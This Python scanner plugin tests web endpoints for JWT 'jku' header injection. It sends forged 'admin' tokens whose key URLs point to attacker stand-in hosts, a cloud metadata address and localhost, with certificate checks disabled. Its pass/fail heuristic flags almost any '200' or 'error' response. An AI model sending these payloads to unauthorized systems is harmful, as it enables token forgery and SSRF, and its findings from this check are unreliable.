import asyncio
import ssl
import json
import base64
from plugins import NaslPlugin, PluginResult


class JwtJkuInjectionDetection(NaslPlugin):
    PLUGIN_ID = 1217
    NAME = 'JWT JKU Header Injection Detection'
    FAMILY = 'Web Applications'
    CVSS_SCORE = 8.6
    DESCRIPTION = 'Detects JWT jku (JWK Set URL) header injection vulnerabilities. The jku header points to a URL containing the public key for verification. If the server fetches the key from the injected URL without proper validation, an attacker can host a malicious JWKS and forge valid tokens.'
    SOLUTION = 'Do not use jku header. If jku support is required, validate the URL against a strict whitelist. Fetch the JWKS over HTTPS with certificate validation.'
    CVE = ['CVE-2018-0114']
    PORTS = [80, 443, 8080, 8443]

    JKU_PAYLOADS = [
        'http://evil.com/jwks.json',
        'https://evil.com/keys.json',
        'http://169.254.169.254/jwks',
        'http://localhost:8080/jwks',
        'https://attacker-controlled.com/jwks',
    ]

    PATHS = [
        '/api/auth/login', '/api/login', '/auth/login', '/api/token',
        '/api/verify', '/api/user', '/api/protected', '/',
    ]

    def _b64url_encode(self, data: bytes) -> str:
        return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

    def _make_jwt(self, jku_url: str) -> str:
        header = {'typ': 'JWT', 'alg': 'HS256', 'jku': jku_url}
        payload = {'sub': 'admin', 'iat': 1516239022}
        hdr_enc = self._b64url_encode(json.dumps(header).encode())
        pay_enc = self._b64url_encode(json.dumps(payload).encode())
        sig = self._b64url_encode(b'invalid')
        return f'{hdr_enc}.{pay_enc}.{sig}'

    async def check_target(self, target: str, port: int | None = None) -> list[PluginResult]:
        results = []
        for port_to_check in (self.PORTS if port is None else [port]):
            try:
                scheme = 'https' if port_to_check in (443, 8443) else 'http'
                ctx = None
                if scheme == 'https':
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                host_header = 'alieninc.tech' if target in ('127.0.0.1', 'localhost', '::1') else target

                for path in self.PATHS:
                    for jku_url in self.JKU_PAYLOADS:
                        try:
                            jwt_token = self._make_jwt(jku_url)
                            reader, writer = await asyncio.wait_for(
                                asyncio.open_connection(target, port_to_check, ssl=ctx), timeout=5
                            )
                            req = (
                                f'GET {path} HTTP/1.1\r\n'
                                f'Host: {host_header}\r\n'
                                f'Authorization: Bearer {jwt_token}\r\n'
                                f'Connection: close\r\n\r\n'
                            )
                            writer.write(req.encode())
                            await writer.drain()
                            response = b''
                            try:
                                while True:
                                    chunk = await asyncio.wait_for(reader.read(4096), timeout=3)
                                    if not chunk:
                                        break
                                    response += chunk
                                    if len(response) > 8192:
                                        break
                            except asyncio.TimeoutError:
                                pass
                            writer.close()
                            await writer.wait_closed()

                            if response:
                                status_line = response.split(b'\r\n', 1)[0].decode(errors='ignore')
                                body = response.split(b'\r\n\r\n', 1)[1].decode(errors='ignore') if b'\r\n\r\n' in response else ''
                                if any(indicator in status_line or indicator in body for indicator in ['200', 'error', 'exception', 'traceback']):
                                    results.append(PluginResult(
                                        vulnerable=True,
                                        target=target,
                                        port=port_to_check,
                                        cvss_score=self.CVSS_SCORE,
                                        severity='high',
                                        description=f'JWT jku header injection detected on {path} with URL: {jku_url}',
                                        solution=self.SOLUTION,
                                        evidence=f'jku URL: {jku_url}, status: {status_line.strip()}',
                                        references=[
                                            'https://portswigger.net/web-security/jwt',
                                            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0114',
                                        ]
                                    ))
                                    break
                        except (asyncio.TimeoutError, ConnectionRefusedError, OSError, ssl.SSLError):
                            pass
                    if results:
                        break
            except (asyncio.TimeoutError, ConnectionRefusedError, OSError, ssl.SSLError):
                pass
        if not results:
            results.append(PluginResult(vulnerable=False, target=target, port=port or 0, description='No JWT jku header injection detected'))
        return results
